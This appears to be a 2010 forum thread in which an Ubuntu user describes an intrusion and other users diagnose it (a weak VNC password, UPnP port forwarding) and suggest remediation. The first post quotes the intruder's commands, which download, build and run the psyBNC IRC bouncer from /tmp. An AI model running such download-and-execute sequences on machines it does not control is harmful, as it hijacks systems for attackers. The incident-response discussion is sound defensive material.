---
title: "Definite Break In - Help?"
date: 2010-03-10
forum: Security
---

### Post by Dennetik on 2010-03-10
Unused as I am to seeing a mouse pointer moving without physically touching my mouse, I was quite stunned to see it happen.

What I actually saw was a terminal open, and it execute the commands:
```

cd /tmp
wget http://www.psybnc.at/download/beta/psyBNC-2.3.2-9.tar.gz
tar -zxvf psyBNC-2.3.2-9.tar.gz
cd psybnc
make
./psybnc

```

So it basically downloaded, build and run a piece of software.

I took the Ubuntu machine offline, and am currently at a loss what more to do. 

I'd would like:
[LIST]
[*]my ubuntu machine to be secure;
[*]to know what caused the leak;
[/LIST]

If there's anyone that could help me, please do.

I'll put up requested information.

---

### Post by Grenage on 2010-03-10
My money is on a remote desktop/vnc and a weak user password.

System/Preferences/Startup Applications.

Check for them there, remove if not needed, and change your password.

---

### Post by Elaztic on 2010-03-10
Install and run a rootkit checker.
Search for this in Synaptic.

---

### Post by mr-woof on 2010-03-10
The software looks like some sort of IRC bot, are you using VNC on the machine? Are you behind a router or directly connected to the net? Are you using openssh with a weak password?

---

### Post by Dennetik on 2010-03-10
> **Grenage said:**
> My money is on a remote desktop/vnc and a weak user password.

System/Preferences/Startup Applications.

Check for them there, remove if not needed, and change your password.

Thanks, this could very well be it. 
Remote Desktop was enabled with a silly 10 token password.

Nothing looking particularly malicious in my Startup Applications.

> **Elaztic said:**
> Install and run a rootkit checker.
Search for this in Synaptic.

Installed 'chkrootkit', and run. Nothing found.

---

### Post by Dennetik on 2010-03-10
> **mr-woof said:**
> The software looks like some sort of IRC bot, are you using VNC on the machine? Are you behind a router or directly connected to the net? Are you using openssh with a weak password?

I found it [here]("http://www.psybnc.at/").
It seemed rather odd to install an IRC-bot, but to answer the other questions:

Yes, ... well, I had VNC capabilities installed. 
And active, as noted above.
These are now all deleted.

I am behind a router. Why does this matter? (Out of curiosity.)

I am also using OpenSSH, any tips on getting this more secure?
It is on simple password now, I'm going to force the use of an RSA key from now on.

---

### Post by Grenage on 2010-03-10
IRC bouncers are common vectors for attacking other machines.  Remove any remote desktop stuff you don't need, remove the bouncer and shore-up your passwords.  For SSH, keys are preferable to passphrases - but I still use a passphrase (it's a good one).

---

### Post by mr-woof on 2010-03-10
I was just wondering if you had any ports forwarding to your machine etc. 

I'd close all vnc/remote desktop/openssh until you have rid of the irc bouncer on the machine, might be worth running rkhunter as well

---

### Post by moody_mark on 2010-03-10
I had a google around about what psybnc is and its defined here loosely

[http://www.osix.net/modules/article/?id=273](http://www.osix.net/modules/article/?id=273)

> If you know nothing about bncs, a bnc is short for a 'bouncer.' A bnc acts as a proxy for irc, allowing you to hide your real IP address and use a vhost psyBNC is an irc tool who can be installed on a shell

So it seems somone is trying to use your machine as an IRC proxy. I wonder how they got through your router, unless you have ports opened up to allow vnc access?

---

### Post by mmillman on 2010-03-10
Correct me if I'm wrong here, but I would also think that you might want to go ahead and see if you can find the piece of software that was installed and uninstall it, or at the very least break it so that it can't run (also make sure it isn't already running as a daemon or something)...  

Because I'd have to assume that if this attacker got this psybnc program succesfully up and running and he (clearly) already knows your ip address, he can probably still use it as intended without having to have access to your SSH or VNC anymore...

I could be wrong there though, but it can't hurt to get rid of that too.

---

### Post by Dennetik on 2010-03-10
> **moody_mark said:**
> I had a google around about what psybnc is and its defined here loosely

[http://www.osix.net/modules/article/?id=273](http://www.osix.net/modules/article/?id=273)



So it seems somone is trying to use your machine as an IRC proxy. I wonder how they got through your router, unless you have ports opened up to allow vnc access?

Apparently there was an old eMule entry on the router, but I doubt the ports matched up. Nothing else is forwarded to the ubuntu machine.

VNC access was only internal. Same for OpenSSH access.

The network also has numerous Windows PC's, who can obviously connect to my machine. I'm afraid one of these is comprimised - they do get port forwards, and one of them is connected directly to the internet.

---

### Post by Grenage on 2010-03-10
Previous posters: Wouldn't uPnP automatically sort the forwarding? ;)

Dennetik: It was more than likely a direct connection through the router to your linux machine.  It can't hurt to scan all machines, if practical.

---

### Post by moody_mark on 2010-03-10
> **Grenage said:**
> Previous posters: Wouldn't uPnP automatically sort the forwarding? ;)

Yes, and some routers have uPnP vulnerabilities. Which router are you using? I wouldnt be surprised if your attacker got control of your router and then found your machine from there, how else would someone outside know your private IP, unless they guessed it (most home networks use 192.168.x.y). Do you see anything in the /var/logs/auth.log?

---

### Post by Dennetik on 2010-03-10
> **moody_mark said:**
> Yes, and some routers have uPnP vulnerabilities. Which router are you using? I wouldnt be surprised if your attacker got control of your router and then found your machine from there, how else would someone outside know your private IP, unless they guessed it (most home networks use 192.168.x.y). Do you see anything in the /var/logs/auth.log?

The stuff is starting to make sense to me.

---

### Post by Grenage on 2010-03-10
I don't think a the user would need to control the router.  If uPnP was forwarding ports then anything hitting the public address on the port being forwarded would hit the PC it was forwarding to.

It was in all likelihood a scripted attack, quite possibly using human interaction when a machine had been successfully connected to.

---

### Post by rookcifer on 2010-03-10
This is what happens when you turn on VNC with no password.  Let it be a lesson learned.  Secondly, you don't need to run any rootkit checker since the attacker did not get root.  Although, if it were me, I would probably reinstall.

I think the Ubuntu devs need to take VNC out of the default install -- it causes too many problems.  At the very least, there should be a couple of warning boxes with big bold text warning about running a VNC server without passwords.

---

### Post by Dennetik on 2010-03-10
> **Grenage said:**
> I don't think a the user would need to control the router.  If uPnP was forwarding ports then anything hitting the public address on the port being forwarded would hit the PC it was forwarding to.

It was in all likelihood a scripted attack, quite possibly using human interaction when a machine had been successfully connected to.

Thanks very much, I think I have the situation under control now.
You helped me a great deal! :)

> **rookcifer said:**
> This is what happens when you turn on VNC with no password.  Let it be a lesson learned.  Secondly, you don't need to run any rootkit checker since the attacker did not get root.  Although, if it were me, I would probably reinstall.

I think the Ubuntu devs need to take VNC out of the default install -- it causes too many problems.  At the very least, there should be a couple of warning boxes with big bold text warning about running a VNC server without passwords.

Read again, I had a password. Just not a very strong password.
About ten characters and vurnerably to a somewhat intelligent dictionary attack.

---

### Post by mr-woof on 2010-03-10
is Vnc installed by default in ubuntu? If so, where is it?

---

### Post by moody_mark on 2010-03-10
Most definitely they had VNC control, I have the same on this PC allowing control with a password. However how did they get through your router? Can you please check your router logs? you might find you cant login to your router. You might also find that some of your other PCs might be compromised, I would personally take my routers WAN connection offline (or unplug the phone / cable line) until i had time to look at the logs and determine if they had control of the router. Thats if the router has decent logging.

What type of router do you have?

---

### Post by cariboo on 2010-03-10
> **mr-woof said:**
> is Vnc installed by default in ubuntu? If so, where is it?

Vino/Vinagre are installed by default, but no enabled. On an Ubuntu system go System->Administration->Remote Desktop and Applications->Internet->Remote Desktop

---

### Post by moody_mark on 2010-03-11
This one really has my curiosity raised. If uPnP was enabled on the router as it is in many home routers, can ports forwarding be initiated from the WAN (internet) side too? If thats so how come I dont see all manner of ports opened up on my home router, as there must be "things" out there scanning my ports all the time.

---

### Post by Grenage on 2010-03-11
Hi again,

uPnP has to be initiated from the LAN side.  If you're interested in reading more about it, you'll want to focus on the Internet Gateway Device Protocol (IGDP), which is implemented through uPnP; it's what controls the mapping.

---

### Post by moody_mark on 2010-03-11
> **Grenage said:**
> uPnP has to be initiated from the LAN side

So how would someone have gotten in from the WAN side, unless you think the ports were already open?

---

### Post by Grenage on 2010-03-11
If you had a remote desktop application running in the background and it supported uPnP (most modern ones do), the ports would have been forwarded automatically.

---

### Post by moody_mark on 2010-03-11
Ah I see, so there could have been another app running on a different machine than the one that got attacked which could have opened up the ports.

It would be interesting to see which ports were open on the router. Dennetik, which ports were open, can you check?

---

### Post by The Cog on 2010-03-12
> **moody_mark said:**
> This one really has my curiosity raised. If uPnP was enabled on the router as it is in many home routers, can ports forwarding be initiated from the WAN (internet) side too? If thats so how come I dont see all manner of ports opened up on my home router, as there must be "things" out there scanning my ports all the time.

Yes. uPnP is http based. I think I remember reading that a browser susceptible to cross-site scripting can be manipulated into sending uPnP requests to the router by bad web pages. I disabled uPnP on my router shortly after reading that, even though I keep my browser patched - others in the family are more lax than I am. Sorry, I can't remember where I read the article.

---

### Post by MarkC502 on 2010-03-13
I always liked the other name for that service "Unplug And Pray"

Disable that and do your own manual port fowarding. If you use a home Linksys or Belkin type router see if it is supported by Open-WRT or DD-WRT which are 3rd party linux based firmware replacements that add worlds of functionality to a home router. You can turn a 50$ linksys into something that rivals a 600-1000$ Cisco router. 

Also I would recomend setting up an Antivirus program on your Ubuntu ( not for it ) that scans all mapped network drives on your windows boxes periodically to try and mitigate that threat.

I think you are probably very lucky and got a cheap wakeup without much damage, thank god for script kiddies or we wouldn't have all these free pentesters out there would we.

Mark C

---

### Post by OpSecShellshock on 2010-03-13
In addition to that: if you must use port forwarding for a specific task, remember to undo it when the task is finished. If it's something that absolutely has to be enabled all the time, then make sure it's only enabled for the specific device that's using it, and not the whole LAN.

Additionally, I'd suggest that on your Windows computer, you use the Windows Firewall software to disable the remote desktop client whenever you aren't using it. I'd suggest doing the same for the Linux machine, but at that point you may as well just use it directly since you'd have to go where it is to turn VNC on and off. In light of that, disabling it on Windows when not in use is a decent alternative. Doing so will protect you in the event that you wind up with a malicious script that is designed to enumerate and connect to other devices on your network (to an extent).

---

